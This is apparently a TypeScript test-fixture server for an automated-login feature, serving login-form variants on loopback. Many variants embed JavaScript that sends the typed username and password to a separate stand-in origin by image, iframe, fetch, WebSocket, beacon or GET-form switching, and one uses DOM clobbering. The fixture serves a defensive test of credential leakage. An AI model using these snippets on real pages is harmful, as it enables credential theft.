// T26d-1（Task 26 の設計書 4.4、6 章）: 自動ログインの段と入力の部品を確かめる、ログインのフォームの fixture のサーバ（テストの補助）。
// - 127.0.0.1 だけで待ち受ける。同じサーバを、2 つの名前で、別の Origin として使う（`originA` が監査の対象、`originB`（`localhost`）が別の
//   Origin。Chromium は `localhost` をループバックに解決する。`login-fixture-server.ts` と同じ）。
// - サーバに届いた要求を、すべて順に記録する（Origin の別、method、path と query、本文）。テストは、URL と本文に資格情報の目印がないことを確かめる。
// - ログインの画面（GET `/form/<形>?to=<結果>`）は、形（`AUTOMATED_LOGIN_FORM_VARIANTS`）ごとのフォームを持ち、送信先は `/auth/<結果>` への POST。
//   形には、フォームの確かめで止まるもの、ページの JS が値を送ろうとするもの（`scripted`）、入れた後に GET に変わるもの、画面そのものが 429 の
//   もの（`rate-limited`）がある。
// - T26g-1（T26R の C1 の再現。レビューの実験の 23 の形）: 別の Origin のサーバ C（`originC`。127.0.0.1 の別のポート）を立て、C にも届いた
//   要求をすべて記録する。ページの JS が入力の値を送ろうとする形（`AUTOMATED_LOGIN_INPUT_LEAK_VARIANTS`: 値が入ったら、画像・iframe・
//   fetch（no-cors の GET）・stylesheet を C と同じ Origin へ、WebSocket、beacon と fetch の POST、query つきの favicon、別の GET のフォーム。
//   `AUTOMATED_LOGIN_SUBMIT_LEAK_VARIANTS`: 押したときや送信の事象の中で GET に変えて送る）と、値を運べない favicon（`favicon-plain`）がある。
// - 送信先（POST `/auth/<結果>`）は、結果（`AUTOMATED_LOGIN_OUTCOMES`）ごとに、成功・資格情報の誤り・ロック・MFA・期限切れ・429・500・どの条件にも
//   当たらない画面・2 つの条件に当たる画面・状態のない成功・2 回目の POST を送ろうとする画面・止めるまで応答しない、応答の前に接続を切る
//   （DEF-099 fix round 1）、を返す。
// - 資格情報は、テストが渡す目印（実行ごとのランダムな値）。値は、記録の本文の中にしか残さない（出力しない）。
import type { IncomingMessage, ServerResponse } from 'node:http';
import type { Duplex } from 'node:stream';
import { startLoopbackHttpServer } from './loopback-server.js';

const STATUS_OK = 200;
const STATUS_SEE_OTHER = 303;
const STATUS_NOT_FOUND = 404;
const STATUS_TOO_MANY_REQUESTS = 429;
const STATUS_INTERNAL_SERVER_ERROR = 500;
/** 429 の `Retry-After`（秒）。 */
export const FIXTURE_RETRY_AFTER_SECONDS = 120;
/** 429 の `Retry-After`（HTTP の日付）の、今からの長さ（ms。1 時間）。 */
export const FIXTURE_RETRY_AFTER_DATE_OFFSET_MS = 3_600_000;
/** WebSocket の upgrade を記録するときの method（T26g-1）。 */
export const WEBSOCKET_UPGRADE_METHOD = 'WEBSOCKET';
/** 秒の単位にそろえる（HTTP の日付は秒の単位）。 */
const SECOND_MS = 1_000;

/** セッションの Cookie の名前（originA）。 */
export const FIXTURE_SESSION_COOKIE = 'sid';
/** 別の Origin（originB）の Cookie の名前（絞り込みで落ちる）。 */
export const FIXTURE_OTHER_ORIGIN_COOKIE = 'idp';
/** 成功の画面が localStorage に書く項目の名前。 */
export const FIXTURE_LOCAL_STORAGE_ITEM = 'ls_token';

/** fixture のパス。 */
export const AUTOMATED_LOGIN_FIXTURE_PATHS = Object.freeze({
  form: '/form/',
  auth: '/auth/',
  home: '/home',
  homePlain: '/home-plain',
  homeBoth: '/home/both',
  loginError: '/login-error',
  locked: '/locked',
  mfa: '/mfa',
  expired: '/expired',
  nowhere: '/nowhere',
  resubmit: '/resubmit',
  otherHop: '/b/hop',
  collect: '/collect',
  framePost: '/frame-post',
} as const);

/** 結果の条件（成功の条件と、自動ログインの失敗の条件）。テストの認証の設定に使う。 */
export const AUTOMATED_LOGIN_FIXTURE_CONDITIONS = Object.freeze({
  success: { pathPrefix: '/home', selector: '#home-ok' },
  invalidCredentials: { pathPrefix: '/login-error', selector: '#invalid' },
  accountLocked: { pathPrefix: '/locked', selector: '#locked' },
  mfaRequired: { pathPrefix: '/mfa', selector: '#mfa' },
  credentialExpired: { pathPrefix: '/expired', selector: '#expired' },
} as const);

/** フォームのセレクタ（すべての形で同じ）。 */
export const AUTOMATED_LOGIN_FIXTURE_SELECTORS = Object.freeze({
  username: '#user',
  password: '#pass',
  submit: '#go',
} as const);

/** 送信先の結果。 */
export const AUTOMATED_LOGIN_OUTCOMES = Object.freeze([
  'success',
  'success-idp',
  'invalid',
  'locked',
  'mfa',
  'expired',
  'rate-seconds',
  'rate-date',
  'error',
  'nomatch',
  'ambiguous',
  'nostate',
  'resubmit',
  'slow',
  'drop',
] as const);
export type AutomatedLoginOutcome = (typeof AUTOMATED_LOGIN_OUTCOMES)[number];

/** ログインの画面の形。 */
export const AUTOMATED_LOGIN_FORM_VARIANTS = Object.freeze([
  'standard',
  'button-outside',
  'clobbered',
  'get',
  'other-origin',
  'formaction',
  'formmethod-get',
  'split',
  // T36a: 3 つの要素が form の外にある画面（form の要素がない）。
  'no-form',
  'password-text',
  'username-textarea',
  'duplicate',
  'button-type-button',
  'target-blank',
  'disabled-user',
  'scripted',
  'switch-to-get',
  'rate-limited',
  'favicon-plain',
  'leak-img-third',
  'leak-iframe-third',
  'leak-fetch-third',
  'leak-css-third',
  'leak-ws-third',
  'leak-img-same',
  'leak-iframe-same',
  'leak-fetch-same',
  'leak-css-same',
  'leak-beacon',
  'leak-fetch-post',
  'leak-favicon-query',
  'leak-late-dup',
  'leak-submit-get',
  'leak-submit-get-third',
  'leak-click-get-submit',
  'leak-click-iframe-get',
] as const);
export type AutomatedLoginFormVariant = (typeof AUTOMATED_LOGIN_FORM_VARIANTS)[number];

/** T26g-1: 値が入った時点（`input` の事象）で、ページの JS が値を別の要求で送ろうとする形（送信の窓の中で止まる。値を入れた後、押す前）。 */
export const AUTOMATED_LOGIN_INPUT_LEAK_VARIANTS = Object.freeze([
  'leak-img-third',
  'leak-iframe-third',
  'leak-fetch-third',
  'leak-css-third',
  'leak-ws-third',
  'leak-img-same',
  'leak-iframe-same',
  'leak-fetch-same',
  'leak-css-same',
  'leak-beacon',
  'leak-fetch-post',
  'leak-favicon-query',
  'leak-late-dup',
] as const satisfies readonly AutomatedLoginFormVariant[]);

/** T26g-1: 押したとき・送信の事象の中で、ページの JS がフォームを GET に変えて送る形（押した後、送信の窓の中で止まる）。 */
export const AUTOMATED_LOGIN_SUBMIT_LEAK_VARIANTS = Object.freeze([
  'leak-submit-get',
  'leak-submit-get-third',
  'leak-click-get-submit',
  'leak-click-iframe-get',
] as const satisfies readonly AutomatedLoginFormVariant[]);

/** サーバに届いた要求の記録。 */
export interface AutomatedLoginFixtureRequest {
  /** `C` は別の Origin のサーバ（T26g-1）。WebSocket の upgrade は method `WEBSOCKET_UPGRADE_METHOD` で記録する。 */
  readonly site: 'A' | 'B' | 'C';
  readonly method: string;
  /** path と query。 */
  readonly path: string;
  /** 本文（UTF-8。なければ空）。 */
  readonly body: string;
  /** サーバが要求を受け取った時刻（`Date.now()`。本文を読む前。DEF-102 fix: 届いた間隔の確かめに使う）。 */
  readonly atMs: number;
}

export interface AutomatedLoginFixtureOptions {
  /** 正しいユーザー名とパスワード（テストの目印）。 */
  readonly username: string;
  readonly password: string;
  /** `slow` の送信先が POST を受けたときに呼ぶ（応答は、`close` まで返さない）。 */
  readonly onSlowPost?: () => void;
}

export interface AutomatedLoginFixture {
  readonly originA: string;
  readonly originB: string;
  /** T26g-1: 別の Origin のサーバ（127.0.0.1 の別のポート）。 */
  readonly originC: string;
  /** 届いた要求（届いた順）。 */
  readonly requests: readonly AutomatedLoginFixtureRequest[];
  /** ログインの画面の URL（originA）。 */
  formUrl(variant: AutomatedLoginFormVariant, outcome: AutomatedLoginOutcome): string;
  /** 送信先の path。 */
  authPath(outcome: AutomatedLoginOutcome): string;
  close(): Promise<void>;
}

function readBody(request: IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    request.on('data', (chunk: Buffer) => chunks.push(chunk));
    request.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    request.on('error', reject);
  });
}

function sendHtml(response: ServerResponse, body: string, status = STATUS_OK, headers: Record<string, string> = {}): void {
  response.writeHead(status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store', ...headers });
  response.end(`<!doctype html><html><head><meta charset="utf-8"><link rel="icon" href="data:,"></head><body>${body}</body></html>`);
}

function redirect(response: ServerResponse, location: string, headers: Record<string, string> = {}): void {
  response.writeHead(STATUS_SEE_OTHER, { location, 'cache-control': 'no-store', ...headers });
  response.end();
}

const USER = '<input name="user" id="user">';
const PASS = '<input name="pass" id="pass" type="password">';
const GO = '<button id="go" type="submit">login</button>';

/**
 * T26g-1: 値が入ったら（パスワードの欄の `input` の事象。1 回だけ）、`body` を動かすスクリプト。`u` と `w` に、入れたユーザー名とパスワードを
 * percent-encode した値がある。
 */
const onFilled = (body: string): string => '<script>let sent = false; document.getElementById("pass").addEventListener("input", () => {'
  + ' if (sent) return; sent = true; const u = encodeURIComponent(document.getElementById("user").value);'
  + ` const w = encodeURIComponent(document.getElementById("pass").value); ${body} });</script>`;

/** T26g-1: 値が入ったら、要素を作って値つきの URL を読ませる。 */
const loadOnFilled = (tag: string, attribute: string, url: string, extra = ''): string => onFilled(
  `const e = document.createElement("${tag}"); ${extra} e.${attribute} = "${url}?u=" + u + "&p=" + w;`
  + ' (e.tagName === "LINK" ? document.head : document.body).appendChild(e);',
);

/** 形ごとのログインの画面の本文。`action` は送信先の path（originA）、`otherAction` は別の Origin の送信先、`third` は別の Origin（C）。 */
function formHtml(variant: AutomatedLoginFormVariant, action: string, otherAction: string, third: string): string {
  const p = AUTOMATED_LOGIN_FIXTURE_PATHS;
  const open = (attributes = ''): string => `<form id="login-form" method="post" action="${action}"${attributes}>`;
  const standard = `${open()}${USER}${PASS}${GO}</form>`;
  const form = 'document.getElementById("login-form")';
  const thirdWebSocket = `ws://${new URL(third).host}`;
  switch (variant) {
    case 'favicon-plain':
      // 値を運べない favicon の GET（path がちょうど `/favicon.ico`、query なし。ブラウザ自身の要求と同じ形）。窓の中でも、理由には数えない。
      // headless の Chromium は `<link rel=icon>` を読まないので、画像として読ませる。
      return standard + onFilled('const e = document.createElement("img"); e.src = "/favicon.ico"; document.body.appendChild(e);');
    case 'leak-img-third':
      return standard + loadOnFilled('img', 'src', `${third}/img`);
    case 'leak-iframe-third':
      return standard + loadOnFilled('iframe', 'src', `${third}/frame`);
    case 'leak-fetch-third':
      return standard + onFilled(`fetch("${third}/fetch?u=" + u + "&p=" + w, { mode: "no-cors" }).catch(() => {});`);
    case 'leak-css-third':
      return standard + loadOnFilled('link', 'href', `${third}/css`, 'e.rel = "stylesheet";');
    case 'leak-ws-third':
      return standard + onFilled(`try { new WebSocket("${thirdWebSocket}/ws?u=" + u + "&p=" + w); } catch (e) {}`);
    case 'leak-img-same':
      return standard + loadOnFilled('img', 'src', '/img');
    case 'leak-iframe-same':
      return standard + loadOnFilled('iframe', 'src', '/frame');
    case 'leak-fetch-same':
      return standard + onFilled('fetch("/fetch?u=" + u + "&p=" + w).catch(() => {});');
    case 'leak-css-same':
      return standard + loadOnFilled('link', 'href', '/css', 'e.rel = "stylesheet";');
    case 'leak-beacon':
      return standard + onFilled(`navigator.sendBeacon("${p.collect}?u=" + u, u + ":" + w);`);
    case 'leak-fetch-post':
      return standard + onFilled(`fetch("${p.collect}?u=" + u, { method: "POST", body: u + ":" + w }).catch(() => {});`);
    case 'leak-favicon-query':
      // query つきの favicon（値を運べる）。headless の Chromium は `<link rel=icon>` を読まないので、画像として読ませる。
      return standard + loadOnFilled('img', 'src', '/favicon.ico');
    case 'leak-late-dup':
      // 値が入ったら、別の GET のフォームに値を写して、JS で送る。
      return `${standard}<form id="dup" method="get" action="${action}"></form>`
        + onFilled('const x = document.createElement("input"); x.name = "leak"; x.value = decodeURIComponent(u);'
          + ' document.getElementById("dup").appendChild(x); setTimeout(() => document.getElementById("dup").submit(), 0);');
    case 'leak-submit-get':
      // 送信の事象（capture）の中で、method を GET に変える。
      return `${standard}<script>${form}.addEventListener("submit", () => { ${form}.method = "get"; }, true);</script>`;
    case 'leak-submit-get-third':
      return `${standard}<script>${form}.addEventListener("submit", () => { ${form}.method = "get"; ${form}.action = "${third}/nav"; }, true);</script>`;
    case 'leak-click-get-submit':
      // 押したときに、既定の送信を止め、GET に変えて JS で送る。
      return `${standard}<script>document.getElementById("go").addEventListener("click", (event) => { event.preventDefault();`
        + ` ${form}.method = "get"; ${form}.submit(); });</script>`;
    case 'leak-click-iframe-get':
      return `${standard}<iframe name="fr" src="about:blank"></iframe>`
        + '<script>document.getElementById("go").addEventListener("click", (event) => { event.preventDefault();'
        + ` ${form}.method = "get"; ${form}.target = "fr"; ${form}.action = "${third}/fr"; ${form}.submit(); });</script>`;
    case 'standard':
      return `${open()}${USER}${PASS}${GO}</form>`;
    case 'button-outside':
      return `${open()}${USER}${PASS}</form><button id="go" type="submit" form="login-form">login</button>`;
    case 'clobbered':
      // DOM clobbering: `form.action`・`form.method`・`form.target` を、同じ名前の入力の欄で上書きする（プロパティで読むと、要素が返る）。
      return `${open()}<input type="hidden" name="action" value="/elsewhere"><input type="hidden" name="method" value="get">`
        + `<input type="hidden" name="target" value="_blank">${USER}${PASS}${GO}</form>`;
    case 'get':
      return `<form id="login-form" method="get" action="${action}">${USER}${PASS}${GO}</form>`;
    case 'other-origin':
      return `<form id="login-form" method="post" action="${otherAction}">${USER}${PASS}${GO}</form>`;
    case 'formaction':
      return `${open()}${USER}${PASS}<button id="go" type="submit" formaction="${p.collect}">login</button></form>`;
    case 'formmethod-get':
      return `${open()}${USER}${PASS}<button id="go" type="submit" formmethod="get">login</button></form>`;
    case 'split':
      return `${open()}${USER}${GO}</form><form id="other-form" method="post" action="${action}">${PASS}</form>`;
    case 'no-form':
      return `<div id="login-box">${USER}${PASS}${GO}</div>`;
    case 'password-text':
      return `${open()}${USER}<input name="pass" id="pass" type="text">${GO}</form>`;
    case 'username-textarea':
      return `${open()}<textarea name="user" id="user"></textarea>${PASS}${GO}</form>`;
    case 'duplicate':
      return `${open()}${USER}${PASS}${GO}</form><input id="user" name="user2">`;
    case 'button-type-button':
      return `${open()}${USER}${PASS}<button id="go" type="button">login</button></form>`;
    case 'target-blank':
      return `${open(' target="_blank"')}${USER}${PASS}${GO}</form>`;
    case 'disabled-user':
      return `${open()}<input name="user" id="user" disabled>${PASS}${GO}</form>`;
    case 'scripted':
      // ページの JS が、入れた値を送ろうとする: パスワードの欄に値が入ったら、サブ frame のフォームから送信先へ POST（main frame でないので
      // Guard が止める。Ledger には残る）。送信の時に、beacon と fetch（どちらも POST）で送る。
      return `${open()}${USER}${PASS}${GO}</form><iframe id="sub" src="${p.framePost}?to=${action.slice(p.auth.length)}"></iframe>`
        + '<script>const value = (id) => document.getElementById(id).value; let framed = false;'
        + 'document.getElementById("pass").addEventListener("input", () => { if (framed) return; framed = true;'
        + ' try { const d = document.getElementById("sub").contentDocument; d.getElementById("fu").value = value("user");'
        + ' d.getElementById("fp").value = value("pass"); d.getElementById("ff").submit(); } catch (e) {} });'
        + 'document.getElementById("login-form").addEventListener("submit", () => { const u = value("user"); const w = value("pass");'
        + ` try { navigator.sendBeacon("${p.collect}?via=beacon&u=" + encodeURIComponent(u), u + ":" + w); } catch (e) {}`
        + ` try { fetch("${p.collect}?via=fetch&u=" + encodeURIComponent(u), { method: "POST", body: u + ":" + w, keepalive: true }).catch(() => {}); } catch (e) {}`
        + '});</script>';
    case 'rate-limited':
      return `${open()}${USER}${PASS}${GO}</form>`;
    case 'switch-to-get':
      // 値を入れた後に、ページの JS がフォームの method を GET に変える（入れた後の確かめ直しで止まる）。
      return `${open()}${USER}${PASS}${GO}</form>`
        + '<script>document.getElementById("pass").addEventListener("input", () => {'
        + ' document.getElementById("login-form").setAttribute("method", "get"); });</script>';
  }
}

export async function startAutomatedLoginFixture(options: AutomatedLoginFixtureOptions): Promise<AutomatedLoginFixture> {
  const requests: AutomatedLoginFixtureRequest[] = [];
  const heldResponses: ServerResponse[] = [];
  let port = 0;
  const originA = (): string => `http://127.0.0.1:${port}`;
  const originB = (): string => `http://localhost:${port}`;
  const siteOf = (request: IncomingMessage): 'A' | 'B' => (request.headers.host?.startsWith('localhost:') === true ? 'B' : 'A');
  const p = AUTOMATED_LOGIN_FIXTURE_PATHS;
  const sessionCookie = `${FIXTURE_SESSION_COOKIE}=s${port}${Date.now()}; Path=/; HttpOnly; SameSite=Lax`;

  /** 正しい資格情報か（本文は urlencoded）。 */
  const isValidLogin = (body: string): boolean => {
    const fields = new URLSearchParams(body);
    return fields.get('user') === options.username && fields.get('pass') === options.password;
  };

  const handleAuth = (outcome: string, body: string, response: ServerResponse): void => {
    switch (outcome as AutomatedLoginOutcome) {
      case 'success':
        if (isValidLogin(body)) {
          redirect(response, p.home, { 'set-cookie': sessionCookie });
        } else {
          redirect(response, p.loginError);
        }
        return;
      case 'success-idp':
        if (isValidLogin(body)) {
          redirect(response, `${originB()}${p.otherHop}`, { 'set-cookie': sessionCookie });
        } else {
          redirect(response, p.loginError);
        }
        return;
      case 'invalid':
        redirect(response, p.loginError);
        return;
      case 'locked':
        redirect(response, p.locked);
        return;
      case 'mfa':
        redirect(response, p.mfa);
        return;
      case 'expired':
        redirect(response, p.expired);
        return;
      case 'rate-seconds':
        sendHtml(response, '<p id="rate">slow down</p>', STATUS_TOO_MANY_REQUESTS, { 'retry-after': String(FIXTURE_RETRY_AFTER_SECONDS) });
        return;
      case 'rate-date': {
        const until = new Date(Math.ceil((Date.now() + FIXTURE_RETRY_AFTER_DATE_OFFSET_MS) / SECOND_MS) * SECOND_MS);
        sendHtml(response, '<p id="rate">slow down</p>', STATUS_TOO_MANY_REQUESTS, { 'retry-after': until.toUTCString() });
        return;
      }
      case 'error':
        sendHtml(response, '<p id="error">error</p>', STATUS_INTERNAL_SERVER_ERROR);
        return;
      case 'nomatch':
        redirect(response, p.nowhere, { 'set-cookie': sessionCookie });
        return;
      case 'ambiguous':
        redirect(response, p.homeBoth, { 'set-cookie': sessionCookie });
        return;
      case 'nostate':
        redirect(response, p.homePlain);
        return;
      case 'resubmit':
        redirect(response, p.resubmit);
        return;
      case 'slow':
        heldResponses.push(response);
        options.onSlowPost?.();
        return;
      case 'drop':
        // DEF-099 fix round 1: 本文を受けてから、応答を返さずに接続を切る（ブラウザがログインの POST を送り直しうる）。
        response.socket?.destroy();
        return;
    }
    sendHtml(response, 'not found', STATUS_NOT_FOUND);
  };

  const handle = async (request: IncomingMessage, response: ServerResponse): Promise<void> => {
    const atMs = Date.now();
    const url = new URL(request.url ?? '/', 'http://fixture.invalid');
    const method = request.method ?? 'GET';
    const body = await readBody(request);
    requests.push({ site: siteOf(request), method, path: `${url.pathname}${url.search}`, body, atMs });
    if (method === 'POST' && url.pathname.startsWith(p.auth)) {
      handleAuth(url.pathname.slice(p.auth.length), body, response);
      return;
    }
    if (method === 'POST') {
      sendHtml(response, 'received');
      return;
    }
    if (url.pathname.startsWith(p.form)) {
      const variant = url.pathname.slice(p.form.length) as AutomatedLoginFormVariant;
      const outcome = url.searchParams.get('to') ?? 'success';
      if (!AUTOMATED_LOGIN_FORM_VARIANTS.includes(variant)) {
        sendHtml(response, 'not found', STATUS_NOT_FOUND);
        return;
      }
      const html = `<h1>LOGIN</h1>${formHtml(variant, `${p.auth}${outcome}`, `${originB()}${p.auth}${outcome}`, originC())}`;
      if (variant === 'rate-limited') {
        // ログインの画面そのものが 429（送信の前）。
        sendHtml(response, html, STATUS_TOO_MANY_REQUESTS, { 'retry-after': String(FIXTURE_RETRY_AFTER_SECONDS) });
        return;
      }
      sendHtml(response, html);
      return;
    }
    switch (url.pathname) {
      case p.home:
        sendHtml(response, `<p id="home-ok">home</p><script>localStorage.setItem("${FIXTURE_LOCAL_STORAGE_ITEM}", "v");</script>`);
        return;
      case p.homePlain:
        sendHtml(response, '<p id="home-ok">home</p>');
        return;
      case p.homeBoth:
        sendHtml(response, '<p id="home-ok">home</p><p id="locked">locked</p>');
        return;
      case p.loginError:
        sendHtml(response, '<p id="invalid">invalid</p>');
        return;
      case p.locked:
        sendHtml(response, '<p id="locked">locked</p>');
        return;
      case p.mfa:
        sendHtml(response, '<p id="mfa">mfa</p>');
        return;
      case p.expired:
        sendHtml(response, '<p id="expired">expired</p>');
        return;
      case p.nowhere:
        sendHtml(response, '<p id="nowhere">nowhere</p>');
        return;
      case p.resubmit:
        // 読み込みの直後に、同じ送信先へ 2 回目の POST を送ろうとする（Guard の回数の上限で止まる）。
        sendHtml(response, `<form id="again" method="post" action="${p.auth}resubmit"><input name="again" value="1"></form>`
          + '<script>document.getElementById("again").submit();</script>');
        return;
      case p.otherHop:
        redirect(response, `${originA()}${p.home}`, { 'set-cookie': `${FIXTURE_OTHER_ORIGIN_COOKIE}=o${port}; Path=/; SameSite=Lax` });
        return;
      case p.framePost:
        sendHtml(response, `<form id="ff" method="post" action="${p.auth}${url.searchParams.get('to') ?? 'success'}">`
          + '<input id="fu" name="user"><input id="fp" name="pass"></form>');
        return;
    }
    sendHtml(response, 'not found', STATUS_NOT_FOUND);
  };

  const server = await startLoopbackHttpServer((request, response) => {
    handle(request, response).catch(() => {
      if (!response.headersSent) {
        response.writeHead(STATUS_INTERNAL_SERVER_ERROR);
      }
      response.end();
    });
  });
  port = server.port;

  // T26g-1: 別の Origin のサーバ C。届いた要求をすべて記録し、何も起こさない画面を返す。WebSocket の upgrade も記録して、すぐに切る。
  const thirdServer = await startLoopbackHttpServer((request, response) => {
    readBody(request).then((body) => {
      const url = new URL(request.url ?? '/', 'http://fixture.invalid');
      requests.push({ site: 'C', method: request.method ?? 'GET', path: `${url.pathname}${url.search}`, body, atMs: Date.now() });
      sendHtml(response, 'third');
    }, () => response.destroy());
  });
  const recordUpgrade = (site: 'A' | 'C') => (request: IncomingMessage, socket: Duplex): void => {
    const url = new URL(request.url ?? '/', 'http://fixture.invalid');
    requests.push({ site, method: WEBSOCKET_UPGRADE_METHOD, path: `${url.pathname}${url.search}`, body: '', atMs: Date.now() });
    socket.destroy();
  };
  thirdServer.server.on('upgrade', recordUpgrade('C'));
  server.server.on('upgrade', recordUpgrade('A'));
  const originC = (): string => thirdServer.origin;

  return {
    get originA() {
      return originA();
    },
    get originB() {
      return originB();
    },
    get originC() {
      return originC();
    },
    requests,
    formUrl: (variant, outcome) => `${originA()}${p.form}${variant}?to=${outcome}`,
    authPath: (outcome) => `${p.auth}${outcome}`,
    close: async () => {
      for (const response of heldResponses.splice(0)) {
        response.destroy();
      }
      // 2 つのサーバの接続を、どちらかの閉じる処理を待つ前に切る（`close` は呼んだときに接続を切る）。
      await Promise.all([server.close(), thirdServer.close()]);
    },
  };
}
